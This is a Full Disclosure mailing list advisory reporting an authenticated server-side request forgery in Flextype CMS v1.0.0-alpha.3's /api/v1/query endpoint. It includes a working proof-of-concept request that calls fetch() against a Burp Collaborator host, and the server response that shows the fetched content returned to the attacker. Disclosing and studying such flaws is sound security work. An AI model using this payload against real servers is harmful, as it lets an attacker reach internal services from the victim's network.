---
title: Flextype v1.0.0-alpha.3 Server-Side Request Forgery via fetch() in Query API
url: https://seclists.org/fulldisclosure/2026/Sep/21
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:33.199822
---

# Flextype v1.0.0-alpha.3 Server-Side Request Forgery via fetch() in Query API

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 Server-Side Request Forgery via fetch() in Query API

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:16:22 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains a server-side request forgery (SSRF)
vulnerability in the expression-processing functionality exposed through
the /api/v1/query endpoint. An authenticated remote attacker can supply an
arbitrary URL to the exposed fetch() function, causing the Flextype server
to initiate an outbound HTTP request to an attacker-controlled destination.

The application does not sufficiently restrict the destination supplied to
fetch(). Testing confirmed that an attacker-controlled expression submitted
through the Query API caused the Flextype server to connect to an external
Burp Collaborator endpoint.

The HTTP response received by the Flextype server, including its status
code, response headers, and response body, was subsequently returned to the
attacker through the API response. The vulnerability therefore provides a
non-blind SSRF primitive and allows an attacker to interact with network
resources from the security context and network position of the Flextype
server.
Impact

Successful exploitation allows an authenticated remote attacker to cause
the Flextype server to initiate arbitrary server-side HTTP requests.

Because the response to the server-side request is returned through the
Query API, an attacker may potentially use the vulnerability to enumerate
and interact with HTTP services accessible from the Flextype host,
including services that are not directly accessible from the attacker's
network location.

Depending on the deployment environment and network configuration,
potential targets may include internal web applications, administrative
interfaces, loopback services, private network resources, and other
HTTP-accessible infrastructure reachable by the Flextype server.

The demonstrated vulnerability is non-blind because response data from the
requested destination is returned to the attacker.
DetailsServer-Side Request Forgery via fetch()

The /api/v1/query endpoint accepts expressions that are evaluated by the
Flextype expression-processing environment. The environment exposes a
fetch() function capable of initiating HTTP requests.

An authenticated attacker can provide an attacker-controlled URL to this
function.

The following request instructs the Flextype server to request an external
Burp Collaborator endpoint:

POST /api/v1/query HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/json

{"token":"lab-token","access_token":"password","query":{"ssrf":"fetch('http://042--snip--.oastify.com';)"}}

The server responds with the result of the outbound request:

HTTP/1.1 200 OK
Host: 127.0.0.1:18080
Date: Mon, 31 Aug 2026 01:49:16 GMT
Connection: close
X-Powered-By: PHP/8.1.34
Set-Cookie: Flextype=438637f69a696e857bd9c8446fe7c8d3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: application/json;charset=UTF-8
Content-Length: 269
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With, Content-Type, Accept,
Origin, Authorization
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
Access-Control-Allow-Expose:
Access-Control-Allow-Credentials: false

{"ssrf":{"reasonPhrase":"OK","statusCode":200,"headers":{"Server":["Burp
Collaborator
https://burpcollaborator.net/"],"X-Collaborator-Version":["4"],"Content-Type":["text/html"],"Content-Length":["55"]},"body":";<html><body>2trzdergwz6ntzdoje2rmtzjjgmgz</body></html>"}}

The returned data identifies the destination as a Burp Collaborator server:

Server: Burp Collaborator https://burpcollaborator.net/
X-Collaborator-Version: 4

Additionally, the destination's response body is returned through Flextype:

<html><body>2trzdergwz6ntzdoje2rmtzjjgmgz</body></html>

This demonstrates that the request originates from the Flextype server and
that response data is made available to the authenticated attacker.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

### Current thread:

* **Flextype v1.0.0-alpha.3 Server-Side Request Forgery via fetch() in Query API** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")